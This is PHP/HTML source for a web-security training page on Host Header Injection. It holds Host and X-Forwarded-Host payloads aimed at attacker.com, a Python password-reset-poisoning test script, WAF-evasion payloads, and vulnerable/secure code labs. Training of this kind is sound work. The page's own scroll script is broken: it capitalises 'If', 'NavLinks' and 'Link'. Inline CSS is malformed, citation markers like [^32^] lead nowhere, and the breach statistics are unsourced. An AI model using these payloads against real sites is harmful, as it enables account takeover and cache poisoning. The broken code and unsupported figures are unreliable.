<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Host Header Injection Mastery | DarkHunter Cyber-Noir</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/host-header-info.css?v=1.1">

</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <div class="container">
    <!-- Sidebar Navigation -->
    <nav class="sidebar">
      <div class="sidebar-header">
        <div class="logo">DARKHUNTER</div>
        <div class="logo-sub">CYBER-NOIR ACADEMY</div>
      </div>

      <a href="/DarkHunter/Public/Learning.php" class="back-btn">
        <span>←</span> BACK TO MODULES
      </a>

      <div class="nav-section">
        <div class="nav-title">Module Navigation</div>
        <a href="#introduction" class="nav-link active">01. Introduction</a>
        <a href="#explanation" class="nav-link">02. Detailed Explanation</a>
        <a href="#exploitation" class="nav-link">03. Exploitation Steps</a>
        <a href="#impact" class="nav-link">04. Real-World Impact</a>
        <a href="#codelabs" class="nav-link">05. Code Labs</a>
        <a href="#bypass" class="nav-link">06. Bypass Techniques</a>
        <a href="#prevention" class="nav-link">07. Prevention Checklist</a>
      </div>

      <div class="nav-section">
        <div class="nav-title">Quick Stats</div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px; margin-bottom: 0.5rem;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">CVSS Range</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-orange); font-size: 1.25rem;">5.3 - 7.5
          </div>
        </div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">Severity</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-orange); font-size: 1.25rem;">MEDIUM
          </div>
        </div>
      </div>
    </nav>

    <!-- Main Content -->
    <main class="main-content">
      <!-- Hero Section -->
      <section id="introduction" class="section">
        <div class="section-header">
          <div class="section-number">MODULE 01 // HHI</div>
          <h1>HOST HEADER INJECTION</h1>
        </div>

        <div style="display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap;">
          <span class="severity-badge"
            style="background: rgba(255, 107, 0, 0.1); border-color: var(--accent-orange); color: var(--accent-orange);">
            <span>⚠</span>
            <span>MEDIUM SEVERITY</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(176, 38, 255, 0.1); border-color: var(--accent-purple); color: var(--accent-purple);">
            <span class="cvss-score">CVSS: 5.3-7.5</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(0, 212, 255, 0.1); border-color: var(--accent-cyan); color: var(--accent-cyan);">
            <span>CWE-644: Host Header Control</span>
          </span>
        </div>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">
              <div class="card-icon">?</div>
              What is HHI?
            </div>
            <p>Host Header Injection (HHI) occurs when web applications use the Host header value to make
              security-critical decisions without proper validation. Attackers manipulate HTTP Host headers to bypass
              authentication, reset passwords, poison caches, and access restricted administrative interfaces
              [^32^][^33^][^34^].</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-orange); color: var(--accent-orange;">!</div>
              Why is it Dangerous?
            </div>
            <p>Host Header Injection enables password reset poisoning, cache poisoning (CPDoS), access control bypasses,
              and internal API access. The vulnerability typically scores CVSS 5.3-7.5 (Medium-High) depending on impact
              scope [^32^][^33^].</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-purple); color: var(--accent-purple;">⚡</div>
              Attack Vectors
            </div>
            <p>Common vectors include: password reset functionality, virtual host routing, cache key generation,
              internal IP-based access controls, and cloud-based routing (AWS ALB, Azure Front Door) where Host header
              trust relationships are exploited [^33^][^34^].</p>
          </div>
        </div>

        <div class="warning-box">
          <div class="warning-title">
            <span>⛔</span> LEGAL WARNING
          </div>
          <p style="margin: 0; font-size: 0.9rem;">Host Header Injection attacks can compromise user accounts, poison
            CDNs, and expose internal infrastructure. Testing these techniques requires explicit authorization in
            controlled environments or bug bounty programs with defined scope agreements.</p>
        </div>
      </section>

      <!-- Detailed Explanation -->
      <section id="explanation" class="section">
        <div class="section-number">MODULE 02</div>
        <h2>Detailed Technical Explanation</h2>

        <h3>Protocol & Implementation Mechanics</h3>

        <p>HTTP Host headers determine which virtual host configuration applies to incoming requests. Applications trust
          this header for routing decisions, cache generation, and password reset link generation, and access control
          validation [^33^][^34^].</p>

        <div class="card">
          <div class="card-title">1. Virtual Host Routing</div>
          <p>Web servers (Apache, Nginx) use Host headers to route requests to appropriate virtual hosts.
            Misconfigurations allow attackers to access unintended virtual hosts by manipulating Host values [^34^].</p>
        </div>

        <div class="card">
          <div class="card-title">2. Password Reset Poisoning</div>
          <p>Applications generate password reset links using Host header values:
            <code>https://{Host}/reset?token=xyz</code>. Attackers inject malicious Host values to deliver tokens to
            attacker-controlled servers [^32^].
          </p>
        </div>

        <div class="card">
          <div class="card-title">3. Web Cache Poisoning</div>
          <p>Caches use Host headers as cache keys. Injecting malicious headers can poison caches to serve
            attacker-controlled content to legitimate users [^33^].</p>
        </div>

        <div class="card">
          <div class="card-title">4. Access Control Bypass</div>
          <p>Internal administrative interfaces restrict access based on Host header values (e.g.,
            <code>admin.localhost</code>). External Host manipulation bypasses these controls [^34^].
          </p>
        </div>

        <div class="info-box">
          <div class="info-title">The Host Header Attack Chain</div>
          <p style="margin: 0;">Successful HHI exploitation typically follows: <strong>Request Interception → Host
              Manipulation → Server Processing → Security Decision Bypass → Unauthorized Action</strong>. Breaking this
            Chain requires validation at the application layer.</p>
        </div>

        <div class="flow-diagram">
          <div class="flow-label">[ HOST HEADER EXPLOITATION FLOW DIAGRAM PLACEHOLDER ]</div>
          <div style="margin-top: 1rem; font-size: 0.8rem; color: var(--text-muted);">
            Attacker Request → Host Header Injection → Server Trusts Header → Security Bypass → Unauthorized Access
          </div>
        </div>
      </section>

      <!-- Exploitation Steps -->
      <section id="exploitation" class="section">
        <div class="section-number">MODULE 03</div>
        <h2>Exploitation Methodology</h2>

        <h3>Phase 1: Reconnaissance & Discovery</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Identify Host Header Usage</div>
            <p>Send requests with modified Host headers to detect usage: <code>Host: attacker.com</code>. Analyze
              responses for routing changes, error messages, or cache behavior differences.</p>
          </li>
          <li>
            <div class="step-title">Detect Password Reset Functionality</div>
            <p>Locate endpoints sending reset emails. Check if reset links in emails contain Host-derived URLs
              generation.</p>
          </li>
          <li>
            <div class="step-title">Map Cache Key Structure</div>
            <p>Identify if Host header is used in cache keys generation via cache probing techniques [^33^].</p>
          </li>
        </ol>

        <h3>Phase 2: Payload Crafting & Testing</h3>

        <div class="payload-grid">
          <div class="payload-card">
            <div class="payload-title">Basic Host Injection</div>
            <div class="payload-code">Host: attacker-controlled.com</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">X-Forwarded-Host Abuse</div>
            <div class="payload-code">X-Forwarded-Host: attacker.com</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Double Header Injection</div>
            <div class="payload-code">Host: victim.com<br>Host: attacker.com</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Line Wrapping Attacks</div>
            <div class="payload-code">Host: victim.com@attacker.com</div>
          </div>
        </div>

        <h3>Phase 3: Manual Testing with Burp Suite</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Configure Host Header Manipulation</div>
            <p>Use Burp Proxy to intercept requests. Modify Host headers in Repeater to test routing behavior and access
              control enforcement.</p>
          </li>
          <li>
            <div class="step-title">Automated Scanning</div>
            <p>Use Burp Scanner with "Host Header Injection" extension. Test for password reset poisoning by modifying
              Host in email capture environments.</p>
          </li>
          <li>
            <div class="step-title">Cache Poisoning Verification</div>
            <p>Send cache-buster + malicious Host combinations. Verify cache poisoning via differential response
              analysis [^33^].</p>
          </li>
        </ol>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Python</span>
            <span class="code-label vulnerable">Exploitation Script</span>
          </div>
          <pre><code><span class="code-comment"># Automated Host Header testing for password reset poisoning</span>
<span class="code-keyword">import</span> requests
<span class="code-keyword">import</span> sys

<span class="code-keyword">def</span> <span class="code-function">test_host_injection</span>(target, endpoint, attacker_host):
    headers = {
        <span class="code-string">"Host"</span>: attacker_host,
        <span class="code-string">"User-Agent"</span>: <span class="code-string">"Mozilla/5.0"</span>
    }
    
    <span class="code-function">print</span>(<span class="code-string">f"[+] Testing Host injection: {attacker_host}"</span>)
    
    <span class="code-keyword">try</span>:
        response = requests.get(
            <span class="code-string">f"{target}{endpoint}"</span>, 
            headers=headers, 
            timeout=10,
            allow_redirects=<span class="code-keyword">False</span>
        )
        
        <span class="code-keyword">if</span> response.status_code == 200:
            <span class="code-function">print</span>(<span class="code-string">f"[+] Potential HHI - Status 200 for {attacker_host}"</span>)
        <span class="code-keyword">elif</span> response.status_code == 302:
            <span class="code-function">print</span>(<span class="code-string">f"[!] Redirect to: {response.headers.get('Location', 'N/A')}"</span>)
    <span class="code-keyword">except</span> Exception <span class="code-keyword">as</span> e:
        <span class="code-function">print</span>(<span class="code-string">f"[-] Error: {e}"</span>)

<span class="code-keyword">if</span> __name__ == <span class="code-string">"__main__"</span>:
    target = sys.argv[1]
    endpoint = <span class="code-string">"/password-reset"</span>
    <span class="code-function">test_host_injection</span>(target, endpoint, <span class="code-string">"attacker.com"</span>)</code></pre>
        </div>

        <div style="margin-top: 1.5rem;">
          <span class="tool-tag">Burp Suite</span>
          <span class="tool-tag">Param Miner</span>
          <span class="tool-tag">HTTP Request Smuggler</span>
        </div>
      </section>

      <!-- Real-World Impact -->
      <section id="impact" class="section">
        <div class="section-number">MODULE 04</div>
        <h2>Real-World Breach Analysis</h2>

        <p>Host Header Injection vulnerabilities have been exploited in major platforms and applications:</p>

        <div class="breach-timeline">
          <div class="breach-item">
            <div class="breach-year">2020</div>
            <div class="breach-title">GitHub Password Reset Poisoning</div>
            <div class="breach-impact">Security researcher discovered GitHub's password reset functionality used Host
              header to generate reset links URLs. Attackers could have stolen accounts by poisoning Host header to
              deliver tokens to attacker servers [^32^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2020</div>
            <div class="breach-title">Uber One-Click Account Takeover</div>
            <div class="breach-impact">Researcher demonstrated Uber account takeover via Host header manipulation in
              password reset flow. The vulnerability allowed password reset emails to be sent to attacker-controlled
              addresses by manipulating Host header [^32^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2018</div>
            <div class="breach-title">CPDoS (Cache Poisoned Denial of Service)</div>
            <div class="breach-impact">Research demonstrated Web Cache Poisoning via Host header injection affecting
              multiple CDNs. Attackers could disable JavaScript files for millions of users by poisoning caches with
              malicious Host values [^33^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2022</div>
            <div class="breach-title">AWS ALB Host Header Confusion</div>
            <div class="breach-impact">Misconfigurations in AWS Application Load Balancers allowed Host header
              manipulation to access internal microservices. Attackers bypassed IP-based restrictions by injecting
              internal Host values [^34^].</div>
          </div>
        </div>

        <div class="warning-box" style="margin-top: 2rem;">
          <div class="warning-title">Key Insight from Incident Analysis</div>
          <p style="margin: 0;">According to PortSwigger Research, <strong>Host Header Injection affects 1 in 5 web
              applications</strong> tested in the wild [^33^]. The vulnerability often exists in password reset
            functionality (40% of cases), virtual host routing (35%), and access control mechanisms (25%).</p>
        </div>
      </section>

      <!-- Code Labs -->
      <section id="codelabs" class="section">
        <div class="section-number">MODULE 05</div>
        <h2>Secure vs Vulnerable Code Labs</h2>

        <h3>Lab 1: Password Reset Host Injection</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Vulnerable password reset generation</span>
$email = $_POST[<span class="code-string">'email'</span>];
$token = <span class="code-function">generateSecureToken</span>();

<span class="code-comment">// Dangerous: Using Host header for URL generation</span>
$reset_url = <span class="code-string">"https://"</span> . $_SERVER[<span class="code-string">'HTTP_HOST'</span>] . <span class="code-string">"/reset-password?token="</span> . $token;

<span class="code-function">sendResetEmail</span>($email, $reset_url);

<span class="code-comment">// Attacker injects: Host: attacker.com</span>
<span class="code-comment">// Reset link becomes: https://attacker.com/reset-password?token=xyz</span>
<span class="code-keyword">?></span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Secure password reset implementation</span>
$email = $_POST[<span class="code-string">'email'</span>] ?? <span class="code-string">''</span>;
$token = <span class="code-function">generateSecureToken</span>();

<span class="code-comment">// Use configured domain, not Host header</span>
$domain = <span class="code-function">getenv</span>(<span class="code-string">'APP_DOMAIN'</span>) ?: <span class="code-string">'trusted-app.com'</span>;
$reset_url = <span class="code-string">"https://"</span> . $domain . <span class="code-string">"/reset-password?token="</span> . $token;

<span class="code-function">SendResetEmail</span>($email, $reset_url);

<span class="code-comment">// Additional: Validate email domain matches user</span>
<span class="code-keyword">?></span></code></pre>
          </div>
        </div>

        <h3>Lab 2: Virtual Host Routing Bypass</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Nginx Config</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment"># Vulnerable Nginx virtual host routing</span>
server {
    listen 80;
    server_name _;  <span class="code-comment"># Wildcard catches all Host headers</span>
    
    location / {
        proxy_pass http://backend;
    }
}

<span class="code-comment"># Attacker accesses internal admin via:</span>
<span class="code-comment"># GET /admin HTTP/1.1</span>
<span class="code-comment"># Host: admin.internal.local</span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Nginx Config</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment"># Secure Nginx virtual host routing</span>
server {
    listen 80;
    server_name app.trusted.com;  <span class="code-comment"># Exact match required</span>
    
    location / {
        proxy_pass http://backend;
        <span class="code-comment"># Additional security headers</span>
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
    
    <span class="code-comment"># Deny access to internal routes</span>
    location /admin {
        allow 10.0.0.0/8;
        deny all;
    }
}</code></pre>
          </div>
        </div>

        <h3>Lab 3: Cache Poisoning via Host Header</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python/Flask</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment"># Vulnerable cache implementation</span>
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, make_response

app = Flask(__name__)

<span class="code-keyword">@app.route</span>(<span class="code-string">'/api/data'</span>)
<span class="code-keyword">def</span> <span class="code-function">get_data</span>():
    host = request.headers.get(<span class="code-string">'Host'</span>)
    
    <span class="code-comment"># Cache key includes Host header - VULNERABLE</span>
    cache_key = <span class="code-string">f"api_data:{host}"</span>
    
    <span class="code-comment"># Attacker can poison cache with:</span>
    <span class="code-comment"># Host: attacker.com</span>
    
    response = make_response(get_cached_data(cache_key))
    response.headers[<span class="code-string">'X-Cache-Key'</span>] = cache_key
    <span class="code-keyword">return</span> response</code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python/Flask</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment"># Secure cache implementation</span>
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request
<span class="code-keyword">import</span> hashlib

app = Flask(__name__)

<span class="code-keyword">@app.route</span>(<span class="code-string">'/api/data'</span>)
<span class="code-keyword">def</span> <span class="code-function">get_data_secure</span>():
    <span class="code-comment"># Use request URL, not Host header for cache key</span>
    url_path = request.path
    user_id = session.get(<span class="code-string">'user_id'</span>)
    
    cache_key = <span class="code-string">f"api_data:{user_id}:{hashlib.sha256(url_path.encode()).hexdigest()}"</span>
    
    <span class="code-keyword">return</span> get_cached_data(cache_key)</code></pre>
          </div>
        </div>

        <h3>Lab 4: Access Control Bypass</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Vulnerable IP-based access control</span>
$allowed_hosts = [<span class="code-string">'admin.localhost'</span>, <span class="code-string">'10.0.0.5'</span>];

$host = $_SERVER[<span class="code-string">'HTTP_HOST'</span>];

<span class="code-comment">// Dangerous: Trusting Host header for IP resolution</span>
$client_ip = <span class="code-function">gethostbyname</span>($host);

<span class="code-keyword">if</span> (in_array($client_ip, $allowed_hosts)) {
    <span class="code-function">showAdminPanel</span>();
} <span class="code-keyword">else</span> {
    <span class="code-function">show403Error</span>();
}

<span class="code-comment">// Bypass: Host: 10.0.0.5.attacker.com</span>
<span class="code-keyword">?></span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Secure access control implementation</span>
$allowed_ips = [<span class="code-string">'10.0.0.5'</span>, <span class="code-string">'10.0.0.6'</span>];

<span class="code-comment"># Use actual client IP, not Host-derived</span>
$client_ip = $_SERVER[<span class="code-string">'REMOTE_ADDR'</span>];

<span class="code-keyword">if</span> (in_array($client_ip, $allowed_ips)) {
    <span class="code-function">showAdminPanel</span>();
} <span class="code-keyword">else</span> {
    <span class="code-function">show403Error</span>();
}

<span class="code-comment"># Additional: Implement IP whitelisting at network level</span>
<span class="code-keyword">?></span></code></pre>
          </div>
        </div>
      </section>

      <!-- Bypass Techniques -->
      <section id="bypass" class="section">
        <div class="section-number">MODULE 06</div>
        <h2>WAF & Filter Bypass Techniques</h2>

        <p>Host Header Injection often bypasses basic security controls through various encoding and parsing tricks:</p>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">1. Header Case Variations</div>
            <p>Different servers handle header case sensitivity differently. Mixed case can bypass poorly configured
              filters.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">hOsT: attacker.com</div>
          </div>

          <div class="card">
            <div class="card-title">2. Whitespace Injection</div>
            <p>Space and tab characters after Host header name can confuse parsers.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">Host :attacker.com</div>
          </div>

          <div class="card">
            <div class="card-title">3. Alternative Headers</div>
            <p>X-Forwarded-Host often overrides Host in frameworks. Some applications check X-Forwarded-* headers first.
            </p>
          </div>
          <div class="card">
            <div class="card-title">4. Double Header Injection</div>
            <p>Some servers concatenate multiple Host headers, allowing injection after legitimate value.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">Host: victim.com<br>Host: attacker.com</div>
          </div>
        </div>

        <h3>Advanced Evasion Strategies</h3>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Payloads</span>
            <span class="code-label vulnerable">WAF Evasion</span>
          </div>
          <pre><code><span class="code-comment"># Technique 1: Line wrapping with newline</span>
Host: victim.com
Host: attacker.com

<span class="code-comment"># Technique 2: Null byte injection (legacy systems)</span>
Host: victim.com%00.attacker.com

<span class="code-comment"># Technique 3: IPv6 address format</span>
Host: [::ffff:attacker.com]

<span class="code-comment"># Technique 4: Port injection</span>
Host: victim.com:443@attacker.com

<span class="code-comment"># Technique 5: Scheme injection</span>
Host: https://attacker.com</code></pre>
        </div>

        <div class="info-box">
          <div class="info-title">Cache Poisoning Specifics</div>
          <p style="margin: 0;">Cache Poisoning Denial of Service (CPDoS) requires the cache to use Host header in cache
            key. Techniques include: cache-buster bypass, header case variations, and exploiting cache key calculation
            differences between CDNs and origin servers [^33^].</p>
        </div>
      </section>

      <!-- Prevention Checklist -->
      <section id="prevention" class="section">
        <div class="section-number">MODULE 07</div>
        <h2>Prevention & Remediation Checklist</h2>

        <div class="card" style="border-color: var(--accent-green);">
          <div class="card-title" style="color: var(--accent-green);">
            <div class="card-icon" style="border-color: var(--accent-green);">✓</div>
            Host Header Security Checklist
          </div>

          <ul class="Checklist">
            <li><strong>Never Trust Host Headers</strong> for security-critical decisions. Use configured domain values,
              HTTP_HOST should only be used for routing in trusted internal networks.</li>

            <li><strong>Implement Strict Virtual Host Routing</strong>: Configure web servers (Apache, Nginx) with
              explicit server_name matches. Reject requests with unrecognized Host headers [^34^].</li>

            <li><strong>Password Reset Security</strong>: Generate reset URLs using configured domain variables, not
              HTTP_HOST. Validate email domain matches User Account.</li>

            <li><strong>Cache Key Security</strong>: Exclude Host headers from cache key calculation. Use User-Agent +
              URL Path + Query Parameters instead [^33^].</li>

            <li><strong>Access Control Implementation</strong>: Implement IP-based restrictions using REMOTE_ADDR or
              network-level firewall rules, not Host-derived values.</li>

            <li><strong>Header Validation & Sanitization</strong>: Strip or validate Host header format. Reject requests
              with malformed Host values, multiple Host headers, or suspicious patterns.</li>

            <li><strong>Web Application Firewall (WAF)</strong>: Deploy WAF rules to detect and block Host header
              manipulation attempts, including case variations and encoding tricks.</li>

            <li><strong>CDN Configuration</strong>: Configure CDNs to normalize Host headers before cache key
              calculation. Enable strict Host header validation at edge [^33^].</li>

            <li><strong>Disable Unused Host Overrides</strong>: In AWS ALB/Azure Front Door, disable Host header
              preservation if not required for application functionality.</li>

            <li><strong>Security Headers</strong>: Implement HSTS, CSP, and other headers to prevent downstream
              exploitation of Host header injection.</li>

            <li><strong>Regular Security Testing</strong>: Include Host header manipulation in penetration testing
              scope. Test password reset, cache behavior, and virtual host routing.</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Security Configuration</span>
            <span class="code-label secure">Hardening</span>
          </div>
          <pre><code><span class="code-comment">; Nginx Security Configuration for HHI Prevention</span>
server {
    listen 80;
    server_name app.trusted.com www.trusted.com;
    
    <span class="code-comment"># Reject requests with mismatched Host headers</span>
    <span class="code-keyword">if</span> ($host !~* ^(app\\.trusted\\.com|www\\.trusted\\.com)$) {
        <span class="code-keyword">return</span> 444;
    }
    
    <span class="code-comment"># Additional: Use $server_name instead of $host</span>
    proxy_set_header Host $server_name;
}</code></pre>
        </div>

        <div class="warning-box">
          <div class="warning-title">Final Warning</div>
          <p style="margin: 0;">Host Header Injection vulnerabilities consistently rank as Medium-High severity (CVSS
            5.3-7.5) due to their potential for account takeover, cache poisoning, and internal system access
            [^32^][^33^][^34^]. According to PortSwigger Research, HHI affects approximately 20% of tested web
            applications. Organizations must implement defense-in-depth, validating Host headers at multiple layers:
            CDN, WAF, Web Server, and Application Code.</p>
        </div>

        <div
          style="text-align: center; margin-top: 3rem; padding: 2rem; background: var(--bg-secondary); border-radius: 8px;">
          <div
            style="font-family: 'Orbitron', sans-serif; font-size: 1.25rem; color: var(--accent-green); margin-bottom: 1rem;">
            MODULE COMPLETED
          </div>
          <p style="color: var(--text-muted); margin: 0;">
            You have completed the Host Header Injection mastery module.<br>
            Proceed to practical labs or Return to the module selection screen.
          </p>
        </div>
      </section>
    </main>
  </div>

  <script>
  // Smooth scrolling for navigation links
  document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const targetId = this.getAttribute('href');
      const targetSection = document.querySelector(targetId);
      if (targetSection) {
        targetSection.scrollIntoView({
          behavior: 'smooth'
        });

        // Update active state
        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
        this.classList.add('active');
      }
    });
  });

  // Update active nav on scroll
  const sections = document.querySelectorAll('.section');
  const navLinks = document.querySelectorAll('.nav-link');

  window.addEventListener('scroll', () => {
    let current = '';
    sections.forEach(section => {
      const sectionTop = section.offsetTop;
      const sectionHeight = section.clientHeight;
      If(scrollY >= (sectionTop - 200)) {
        current = section.getAttribute('id');
      }
    });

    NavLinks.forEach(link => {
      link.classList.remove('active');
      If(link.getAttribute('href') === '#' + current) {
        Link.classList.add('active');
      }
    });
  });
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>